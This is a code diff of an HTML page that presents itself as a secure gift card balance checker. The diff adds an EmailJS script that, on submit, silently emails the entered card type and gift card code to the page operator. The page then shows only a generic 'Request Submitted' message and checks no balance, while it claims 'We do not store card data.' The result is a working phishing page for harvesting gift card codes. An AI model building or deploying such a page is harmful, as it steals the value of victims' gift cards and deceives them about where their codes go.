@@ -2,19 +2,27 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Check Gift Card Balance</title>
+<title>Check Gift Cards Balance</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <!-- Font Awesome -->
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+<!-- EmailJS -->
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script>
+(function(){
+  emailjs.init("11I_SW_7xkOdPGwej");
+})();
+</script>
 
 <style>
 * { box-sizing: border-box; }
 
 body {
   margin: 0;
-  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-  background: linear-gradient(180deg, #f6f9fc, #ffffff);
+  font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+  background: linear-gradient(135deg, #f4f7fb, #e9eef6);
   color: #111;
 }
 
@@ -29,22 +37,16 @@ body {
 .box {
   width: 100%;
   max-width: 420px;
-  background: #fff;
+  background: #ffffff;
   border-radius: 10px;
   padding: 26px;
-  box-shadow: 0 10px 30px rgba(0,0,0,0.08);
-  animation: fadeIn 0.6s ease;
-}
-
-@keyframes fadeIn {
-  from { opacity: 0; transform: translateY(10px); }
-  to { opacity: 1; transform: translateY(0); }
+  box-shadow: 0 12px 30px rgba(0,0,0,0.08);
 }
 
 h1 {
-  font-size: 19px;
+  font-size: 20px;
   text-align: center;
-  margin: 0 0 6px;
+  margin-bottom: 6px;
 }
 
 .subtitle {
@@ -58,132 +60,116 @@ label {
   font-size: 12px;
   margin-top: 14px;
   display: block;
-  color: #444;
+  font-weight: 600;
 }
 
 select, input {
   width: 100%;
-  padding: 12px;
+  padding: 11px;
   margin-top: 6px;
-  border: 1px solid #dcdcdc;
-  font-size: 14px;
   border-radius: 6px;
-  background: #fff;
-}
-
-select {
-  appearance: none;
-  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='14' height='14'%3E%3Cpath fill='%23666' d='M4 6l3 3 3-3z'/%3E%3C/svg%3E");
-  background-repeat: no-repeat;
-  background-position: right 12px center;
+  border: 1px solid #d0d7e2;
+  font-size: 14px;
+  background: #f9fbff;
 }
 
 select:focus, input:focus {
   outline: none;
   border-color: #1a73e8;
+  background: #fff;
 }
 
 button {
   width: 100%;
   margin-top: 20px;
-  padding: 13px;
+  padding: 12px;
   background: #1a73e8;
   border: none;
   color: #fff;
   font-size: 15px;
-  cursor: pointer;
+  font-weight: 600;
   border-radius: 6px;
-  transition: transform 0.15s ease, box-shadow 0.15s ease;
+  cursor: pointer;
 }
 
 button:hover {
-  transform: translateY(-1px);
-  box-shadow: 0 6px 16px rgba(26,115,232,0.3);
+  background: #1558b0;
 }
 
-/* Card icons */
 .card-icons {
   display: flex;
   justify-content: center;
-  gap: 14px;
-  margin: 14px 0 4px;
+  gap: 12px;
+  margin: 14px 0 6px;
 }
 
 .card-icon {
-  width: 32px;
-  height: 32px;
-  transition: transform 0.3s ease;
+  width: 34px;
+  height: 22px;
+  object-fit: contain;
+  border-radius: 4px;
 }
 
-.card-icon:hover {
-  transform: scale(1.12);
+.notice {
+  margin-top: 18px;
+  font-size: 11px;
+  color: #777;
+  text-align: center;
 }
 
-/* Loader */
 .loader {
   display: none;
-  font-size: 13px;
+  font-size: 12px;
   text-align: center;
-  margin-top: 12px;
+  margin-top: 10px;
   color: #555;
 }
 
-/* Footer */
-.footer {
-  margin-top: 22px;
-  font-size: 11px;
+/* Popup */
+.overlay {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.4);
+  z-index: 900;
+}
+
+.popup {
+  display: none;
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  background: #fff;
+  border-radius: 10px;
+  padding: 24px;
+  max-width: 320px;
   text-align: center;
-  color: #777;
-  line-height: 1.5;
+  z-index: 1000;
+  box-shadow: 0 12px 30px rgba(0,0,0,0.2);
 }
 
-.footer a {
-  color: #1a73e8;
-  text-decoration: none;
+.popup h2 {
+  font-size: 17px;
+  margin-top: 0;
 }
 
-.footer a:hover {
-  text-decoration: underline;
+.popup p {
+  font-size: 13px;
+  color: #555;
+}
+
+.popup button {
+  margin-top: 14px;
+  background: #1a73e8;
+  color: #fff;
+  padding: 9px 16px;
+  font-size: 13px;
+  border-radius: 6px;
+  border: none;
+  cursor: pointer;
 }
 </style>
-
-<script>
-let lastSubmit = 0;
-
-function validateForm() {
-  const now = Date.now();
-  if (now - lastSubmit < 15000) {
-    alert("Please wait before submitting again.");
-    return false;
-  }
-  lastSubmit = now;
-
-  const type = document.getElementById("card_type").value;
-  const code = document.getElementById("card_code").value.trim();
-
-  if (!type || !code) {
-    alert("Please select a card type and enter a valid code.");
-    return false;
-  }
-
-  const rules = {
-    "Amazon": [13, 14],
-    "Apple": [16],
-    "Google Play": [16],
-    "Steam": [15, 17],
-    "Xbox": [25],
-    "eBay": [13]
-  };
-
-  if (rules[type] && !rules[type].includes(code.length)) {
-    alert("Invalid code format for the selected card.");
-    return false;
-  }
-
-  document.getElementById("loader").style.display = "block";
-  return true;
-}
-</script>
 </head>
 
 <body>
@@ -192,13 +178,13 @@ function validateForm() {
   <div class="box">
 
     <h1>Gift Card Balance Checker</h1>
-    <div class="subtitle">Secure & informational verification tool</div>
+    <div class="subtitle">Fast, secure & informational balance request tool</div>
 
-    <form onsubmit="return validateForm()">
+    <form id="giftForm">
 
       <label>Gift Card Type</label>
-      <select id="card_type" name="card_type" required>
-        <option value="">Select</option>
+      <select name="card_type" required>
+        <option value="">Select card type</option>
         <option>Amazon</option>
         <option>Apple</option>
         <option>Google Play</option>
@@ -206,35 +192,81 @@ function validateForm() {
         <option>Xbox</option>
         <option>PlayStation</option>
         <option>eBay</option>
+        <option>Visa / Mastercard</option>
         <option>Other</option>
       </select>
 
+      <!-- REAL COLORED CARD ICONS -->
       <div class="card-icons">
-        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/amazon.svg" style="filter:none;">
-        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/apple.svg">
-        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/googleplay.svg">
-        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/steam.svg">
-        <img class="card-icon" src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/ebay.svg">
+        <img class="card-icon" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg">
+        <img class="card-icon" src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
+        <img class="card-icon" src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Google_Play_Store_badge_EN.svg">
+        <img class="card-icon" src="https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg">
+        <img class="card-icon" src="https://upload.wikimedia.org/wikipedia/commons/4/43/Xbox_logo.svg">
+        <img class="card-icon" src="https://upload.wikimedia.org/wikipedia/commons/1/1b/EBay_logo.svg">
       </div>
 
       <label>Card Code</label>
-      <input id="card_code" type="text" name="card_code" placeholder="Enter card code" required>
+      <input type="text" name="card_code" placeholder="Enter gift card code" required>
 
       <button type="submit">
         <i class="fa-solid fa-magnifying-glass"></i> Check Balance
       </button>
 
-      <div id="loader" class="loader">Processing request…</div>
+      <div class="loader" id="loader">Processing request…</div>
     </form>
 
-    <div class="footer">
-      This service does not store card data.<br>
-      Verify balances with official issuers only.<br>
-      <a href="#">Privacy Policy</a> · <a href="#">Terms of Service</a>
+    <div class="notice">
+      We do not store card data.<br>
+      Always confirm balances with official issuers.
     </div>
 
   </div>
 </div>
+
+<div class="overlay" id="overlay"></div>
+
+<div class="popup" id="successPopup">
+  <h2>Request Submitted</h2>
+  <p>Your request has been received successfully.</p>
+  <button onclick="closePopup()">Close</button>
+</div>
+
+<div class="popup" id="errorPopup">
+  <h2>Error</h2>
+  <p>Please check your details and try again.</p>
+  <button onclick="closePopup()">Close</button>
+</div>
+
+<script>
+function showPopup(id) {
+  document.getElementById("overlay").style.display = "block";
+  document.getElementById(id).style.display = "block";
+}
+
+function closePopup() {
+  document.getElementById("overlay").style.display = "none";
+  document.getElementById("successPopup").style.display = "none";
+  document.getElementById("errorPopup").style.display = "none";
+}
+
+document.getElementById("giftForm").addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  document.getElementById("loader").style.display = "block";
+
+  emailjs.sendForm("service_10mvkrc", "template_97kc5d6", this)
+    .then(() => {
+      document.getElementById("loader").style.display = "none";
+      showPopup("successPopup");
+      this.reset();
+    })
+    .catch(() => {
+      document.getElementById("loader").style.display = "none";
+      showPopup("errorPopup");
+    });
+});
+</script>
 
 </body>
 </html>
